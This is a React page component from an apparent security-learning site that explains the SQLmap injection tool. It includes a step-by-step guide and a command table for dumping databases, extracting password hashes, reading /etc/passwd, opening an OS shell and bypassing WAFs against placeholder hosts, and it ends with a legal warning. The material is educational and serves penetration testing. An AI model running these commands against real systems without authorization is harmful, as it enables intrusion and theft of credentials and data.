import { Link } from "react-router-dom";

export default function SQLmap() {
  return (
<div className="px-10 py-16 max-w-7xl mx-auto text-white">


      {/* BACK TO TOOLS */}
      <Link
        to="/tools"
        className="inline-block mb-6 text-cyan-400 hover:underline"
      >
        ← Back to Tools
      </Link>

      {/* TITLE */}
      <h1 className="text-5xl font-bold mb-4 text-cyan-400">
        SQLmap (Automated SQL Injection Tool)
      </h1>

      {/* BADGES */}
      <div className="flex flex-wrap gap-3 mb-10">
        <span className="px-3 py-1 text-sm rounded-full bg-green-600/20 text-green-400 border border-green-500/30">
          Beginner Friendly
        </span>
        <span className="px-3 py-1 text-sm rounded-full bg-yellow-600/20 text-yellow-400 border border-yellow-500/30">
          Intermediate
        </span>
        <span className="px-3 py-1 text-sm rounded-full bg-red-600/20 text-red-400 border border-red-500/30">
          Advanced
        </span>
        <span className="px-3 py-1 text-sm rounded-full bg-purple-600/20 text-purple-400 border border-purple-500/30">
          SQL Injection
        </span>
      </div>

      {/* ===============================
          WHAT IS SQLMAP
      =============================== */}
      <section className="mb-10">
        <h2 className="text-2xl font-semibold mb-4 text-cyan-300">
          What is SQLmap?
        </h2>

        <p className="text-gray-300 leading-relaxed mb-4">
          <strong>SQLmap</strong> is a powerful
          <strong> open-source automated SQL injection and database takeover tool</strong>
          used in cybersecurity to identify and exploit SQL injection
          vulnerabilities in web applications.
        </p>

        <p className="text-gray-300 leading-relaxed mb-4">
          It automates the entire SQL injection process — from detecting
          vulnerabilities to extracting database contents — which would
          otherwise require deep manual testing and advanced SQL knowledge.
        </p>

        <p className="text-gray-300 leading-relaxed mb-4">
          SQLmap supports a wide range of database management systems
          including <strong>MySQL, PostgreSQL, Oracle, Microsoft SQL Server,
          SQLite, MariaDB, and IBM DB2</strong>.
        </p>

        <p className="text-gray-300 leading-relaxed">
          Due to its automation, accuracy, and flexibility, SQLmap is widely
          used by <strong>penetration testers, ethical hackers, security
          researchers, and red teams</strong> during web application
          security assessments.
        </p>
      </section>

      {/* ===============================
          HOW SQLMAP WORKS
      =============================== */}
      <section className="mb-10">
        <h2 className="text-2xl font-semibold mb-4 text-cyan-300">
          How SQLmap Works
        </h2>

        <p className="text-gray-300 leading-relaxed mb-6">
          SQLmap works by sending specially crafted HTTP requests to a
          target web application and analyzing the responses to determine
          whether SQL injection vulnerabilities exist.
        </p>

        <ul className="list-disc list-inside text-gray-300 leading-relaxed space-y-5">

          <li>
            <strong>Input Analysis:</strong><br />
            SQLmap analyzes URL parameters, POST data, cookies, and headers
            to identify potential injection points.
          </li>

          <li>
            <strong>Payload Injection:</strong><br />
            It injects hundreds of SQL payloads using different techniques
            such as boolean-based, error-based, time-based, and UNION-based
            injections.
          </li>

          <li>
            <strong>Response Comparison:</strong><br />
            SQLmap compares server responses to detect anomalies that
            indicate successful SQL injection.
          </li>

          <li>
            <strong>Database Fingerprinting:</strong><br />
            Once vulnerable, SQLmap automatically identifies the
            backend database type, version, and operating system.
          </li>

          <li>
            <strong>Data Extraction:</strong><br />
            SQLmap can extract databases, tables, columns, records,
            users, passwords, and even system files if permissions allow.
          </li>

          <li>
            <strong>Post-Exploitation:</strong><br />
            Advanced features allow privilege escalation, file upload,
            command execution, and OS shell access.
          </li>

        </ul>
      </section>

      {/* ===============================
    WHAT SQLMAP DOES
=============================== */}
<section className="mb-10">
  <h2 className="text-2xl font-semibold mb-4 text-cyan-300">
    What Does SQLmap Do?
  </h2>

  <p className="text-gray-300 leading-relaxed mb-6">
    SQLmap automates the process of detecting, exploiting, and validating
    <strong> SQL Injection vulnerabilities</strong> in web applications.
    It eliminates the need for manual payload crafting by intelligently
    testing input parameters and analyzing server responses.
  </p>

  <ul className="list-disc list-inside text-gray-300 leading-relaxed space-y-5">

    <li>
      <strong>Detects SQL Injection Vulnerabilities:</strong><br />
      SQLmap automatically scans GET parameters, POST data, cookies,
      HTTP headers, and JSON/XML inputs to identify SQL injection
      points using multiple injection techniques.
    </li>

    <li>
      <strong>Identifies Backend Database Technology:</strong><br />
      Once a vulnerability is found, SQLmap fingerprints the backend
      database management system, its version, and sometimes the
      underlying operating system.
    </li>

    <li>
      <strong>Enumerates Database Structure:</strong><br />
      SQLmap can list available databases, tables, columns, and data
      types, helping testers understand the internal structure of
      the target database.
    </li>

    <li>
      <strong>Dumps Sensitive Database Data:</strong><br />
      It extracts records from tables, including sensitive information
      such as user details, application data, and confidential records,
      depending on database permissions.
    </li>

    <li>
      <strong>Extracts Database Credentials:</strong><br />
      SQLmap retrieves database usernames, password hashes, roles,
      and privilege levels, which can be used to assess access control
      weaknesses.
    </li>

    <li>
      <strong>Bypasses Security Mechanisms:</strong><br />
      SQLmap uses tamper scripts, payload obfuscation, encoding, and
      timing techniques to evade Web Application Firewalls (WAFs),
      Intrusion Detection Systems (IDS), and input filters.
    </li>

    <li>
      <strong>Performs Advanced Post-Exploitation:</strong><br />
      In misconfigured environments, SQLmap can execute operating
      system commands, read or write files, and provide an
      interactive OS shell.
    </li>

    <li>
      <strong>Supports Automated Security Testing:</strong><br />
      SQLmap integrates easily into penetration testing workflows
      and automated security assessments, making it suitable for
      both manual testers and red team operations.
    </li>

  </ul>
</section>

      {/* =============================== 
    STEP BY STEP USING SQLMAP
=============================== */}
<section className="mb-10">
  <h2 className="text-2xl font-semibold mb-4 text-cyan-300">
    Step-by-Step Using SQLmap
  </h2>

  <p className="text-gray-300 leading-relaxed mb-6">
    This step-by-step guide demonstrates how SQLmap is commonly used
    during a web application security assessment — starting from
    vulnerability detection to database extraction and advanced
    exploitation. The workflow is suitable for beginners and
    mirrors real-world penetration testing methodology.
  </p>

  <ol className="list-decimal list-inside text-gray-300 leading-relaxed space-y-6">

    <li>
      <strong>Install SQLmap:</strong><br />
      SQLmap comes pre-installed in Kali Linux. If not installed,
      it can be installed using Git.
      <pre className="mt-2 bg-gray-900 p-3 rounded text-sm text-gray-300">
git clone https://github.com/sqlmapproject/sqlmap.git
      </pre>
    </li>

    <li>
      <strong>Identify a Target URL:</strong><br />
      Look for URLs with query parameters that interact with a database.
      <pre className="mt-2 bg-gray-900 p-3 rounded text-sm text-gray-300">
http://testsite.com/product.php?id=1
      </pre>
      <span className="text-sm text-gray-400">
        Parameters like <code>id</code>, <code>user</code>, or <code>cat</code> are common injection points.
      </span>
    </li>

    <li>
      <strong>Basic SQL Injection Test:</strong><br />
      Run SQLmap against the target URL to check for SQL injection
      vulnerabilities.
      <pre className="mt-2 bg-gray-900 p-3 rounded text-sm text-gray-300">
sqlmap -u "http://testsite.com/product.php?id=1"
      </pre>
    </li>

    <li>
      <strong>Confirm SQL Injection & Database Fingerprinting:</strong><br />
      If the parameter is injectable, SQLmap will automatically
      identify the backend database type, version, and operating system.
      <pre className="mt-2 bg-gray-900 p-3 rounded text-sm text-gray-300">
[INFO] backend DBMS: MySQL
      </pre>
    </li>

    <li>
      <strong>Enumerate Available Databases:</strong><br />
      List all databases accessible through the vulnerable parameter.
      <pre className="mt-2 bg-gray-900 p-3 rounded text-sm text-gray-300">
sqlmap -u "http://testsite.com/product.php?id=1" --dbs
      </pre>
    </li>

    <li>
      <strong>Select a Database and List Tables:</strong><br />
      Choose a database and enumerate its tables.
      <pre className="mt-2 bg-gray-900 p-3 rounded text-sm text-gray-300">
sqlmap -u "http://testsite.com/product.php?id=1" -D shopdb --tables
      </pre>
    </li>

    <li>
      <strong>Enumerate Table Columns:</strong><br />
      Identify columns inside a specific table.
      <pre className="mt-2 bg-gray-900 p-3 rounded text-sm text-gray-300">
sqlmap -u "http://testsite.com/product.php?id=1" -D shopdb -T users --columns
      </pre>
    </li>

    <li>
      <strong>Dump Table Data:</strong><br />
      Extract records from selected columns or the entire table.
      <pre className="mt-2 bg-gray-900 p-3 rounded text-sm text-gray-300">
sqlmap -u "http://testsite.com/product.php?id=1" -D shopdb -T users --dump
      </pre>
    </li>

    <li>
      <strong>Extract Database Users and Password Hashes:</strong><br />
      Retrieve database-level credentials if permissions allow.
      <pre className="mt-2 bg-gray-900 p-3 rounded text-sm text-gray-300">
sqlmap -u "http://testsite.com/product.php?id=1" --users --passwords
      </pre>
    </li>

    <li>
      <strong>Advanced Exploitation (Optional):</strong><br />
      Attempt operating system command execution on misconfigured servers.
      <pre className="mt-2 bg-gray-900 p-3 rounded text-sm text-gray-300">
sqlmap -u "http://testsite.com/product.php?id=1" --os-shell
      </pre>
      <span className="text-sm text-gray-400">
        Requires high privileges and vulnerable server configuration.
      </span>
    </li>

  </ol>
</section>

      {/* ===============================
    SQLMAP COMMANDS & USAGE
=============================== */}
<section className="mb-10">
  <h2 className="text-2xl font-semibold mb-4 text-cyan-300">
    SQLmap Commands (Kali Linux)
  </h2>

  <p className="text-gray-300 leading-relaxed mb-6">
    The table below lists commonly used <strong>SQLmap commands</strong>
    along with their purpose. These commands follow the same structured
    style as Nmap and Wireshark command references, making them easy
    for beginners to understand and apply.
  </p>

  <div className="overflow-x-auto">
    <table className="w-full border border-gray-700 text-sm">
      <thead className="bg-gray-800 text-cyan-300">
        <tr>
          <th className="px-4 py-3 border border-gray-700 w-2/5">
            Command
          </th>
          <th className="px-4 py-3 border border-gray-700 w-3/5">
            Purpose
          </th>
        </tr>
      </thead>

      <tbody className="text-gray-300 leading-relaxed">

        <tr>
          <td className="px-4 py-3 border border-gray-700 font-mono">
            sqlmap -u "http://site.com/page.php?id=1"
          </td>
          <td className="px-4 py-3 border border-gray-700">
            Tests a URL parameter for SQL injection vulnerabilities.
          </td>
        </tr>

        <tr>
          <td className="px-4 py-3 border border-gray-700 font-mono">
            sqlmap -u "URL" --dbs
          </td>
          <td className="px-4 py-3 border border-gray-700">
            Enumerates all databases available on the target server.
          </td>
        </tr>

        <tr>
          <td className="px-4 py-3 border border-gray-700 font-mono">
            sqlmap -u "URL" -D database_name --tables
          </td>
          <td className="px-4 py-3 border border-gray-700">
            Lists all tables inside a specific database.
          </td>
        </tr>

        <tr>
          <td className="px-4 py-3 border border-gray-700 font-mono">
            sqlmap -u "URL" -D db -T table --columns
          </td>
          <td className="px-4 py-3 border border-gray-700">
            Displays column names of a selected table.
          </td>
        </tr>

        <tr>
          <td className="px-4 py-3 border border-gray-700 font-mono">
            sqlmap -u "URL" -D db -T table -C col1,col2 --dump
          </td>
          <td className="px-4 py-3 border border-gray-700">
            Dumps specific column data from a table.
          </td>
        </tr>

        <tr>
          <td className="px-4 py-3 border border-gray-700 font-mono">
            sqlmap -u "URL" --dump-all
          </td>
          <td className="px-4 py-3 border border-gray-700">
            Dumps all databases, tables, and records.
          </td>
        </tr>

        <tr>
          <td className="px-4 py-3 border border-gray-700 font-mono">
            sqlmap -u "URL" --users
          </td>
          <td className="px-4 py-3 border border-gray-700">
            Lists database users.
          </td>
        </tr>

        <tr>
          <td className="px-4 py-3 border border-gray-700 font-mono">
            sqlmap -u "URL" --passwords
          </td>
          <td className="px-4 py-3 border border-gray-700">
            Extracts password hashes of database users.
          </td>
        </tr>

        <tr>
          <td className="px-4 py-3 border border-gray-700 font-mono">
            sqlmap -u "URL" --current-user
          </td>
          <td className="px-4 py-3 border border-gray-700">
            Displays the current database user.
          </td>
        </tr>

        <tr>
          <td className="px-4 py-3 border border-gray-700 font-mono">
            sqlmap -u "URL" --is-dba
          </td>
          <td className="px-4 py-3 border border-gray-700">
            Checks whether the current user has DBA privileges.
          </td>
        </tr>

        <tr>
          <td className="px-4 py-3 border border-gray-700 font-mono">
            sqlmap -u "URL" --os-shell
          </td>
          <td className="px-4 py-3 border border-gray-700">
            Attempts to obtain an interactive operating system shell.
          </td>
        </tr>

        <tr>
          <td className="px-4 py-3 border border-gray-700 font-mono">
            sqlmap -u "URL" --file-read=/etc/passwd
          </td>
          <td className="px-4 py-3 border border-gray-700">
            Reads files from the target server (if permitted).
          </td>
        </tr>

        <tr>
          <td className="px-4 py-3 border border-gray-700 font-mono">
            sqlmap -u "URL" --tamper=space2comment
          </td>
          <td className="px-4 py-3 border border-gray-700">
            Bypasses WAF or filters using tamper scripts.
          </td>
        </tr>

      </tbody>
    </table>
  </div>
</section>

      {/* ===============================
          CORE SQLMAP FEATURES
      =============================== */}
      <section className="mb-10">
        <h2 className="text-2xl font-semibold mb-4 text-cyan-300">
          Core SQLmap Features
        </h2>

        <div className="overflow-x-auto">
          <table className="w-full border border-gray-700 text-sm">
            <thead className="bg-gray-800 text-cyan-300">
              <tr>
                <th className="px-4 py-3 border border-gray-700 w-1/4">
                  Feature
                </th>
                <th className="px-4 py-3 border border-gray-700 w-3/4">
                  Detailed Explanation
                </th>
              </tr>
            </thead>

            <tbody className="text-gray-300 leading-relaxed">

              <tr>
                <td className="px-4 py-3 border border-gray-700 font-semibold">
                  Automated Detection
                </td>
                <td className="px-4 py-3 border border-gray-700">
                  Automatically detects SQL injection vulnerabilities
                  using multiple techniques without manual payload crafting.
                </td>
              </tr>

              <tr>
                <td className="px-4 py-3 border border-gray-700 font-semibold">
                  Multiple Injection Techniques
                </td>
                <td className="px-4 py-3 border border-gray-700">
                  Supports boolean-based, error-based, time-based,
                  UNION-based, stacked queries, and out-of-band injections.
                </td>
              </tr>

              <tr>
                <td className="px-4 py-3 border border-gray-700 font-semibold">
                  Database Enumeration
                </td>
                <td className="px-4 py-3 border border-gray-700">
                  Extracts databases, tables, columns, records,
                  users, and password hashes.
                </td>
              </tr>

              <tr>
                <td className="px-4 py-3 border border-gray-700 font-semibold">
                  WAF Bypass
                </td>
                <td className="px-4 py-3 border border-gray-700">
                  Uses tamper scripts and payload obfuscation
                  to bypass firewalls and intrusion detection systems.
                </td>
              </tr>

              <tr>
                <td className="px-4 py-3 border border-gray-700 font-semibold">
                  OS Command Execution
                </td>
                <td className="px-4 py-3 border border-gray-700">
                  Allows execution of system commands and file
                  operations on misconfigured servers.
                </td>
              </tr>

            </tbody>
          </table>
        </div>
      </section>

      {/* ===============================
    IMPORTANT NOTE
=============================== */}
<section className="bg-red-900/20 border border-red-500/30 rounded-lg p-6">
  <h2 className="text-xl font-semibold mb-3 text-red-400">
    ⚠ Legal & Ethical Warning
  </h2>

  <p className="text-gray-300 leading-relaxed">
    SQLmap should be used <strong>only on web applications and
    databases you own or have explicit permission to test</strong>.
    Using SQLmap to exploit SQL injection vulnerabilities on
    unauthorized systems is illegal and may result in serious
    legal consequences.
  </p>
</section>
    </div>
  );
}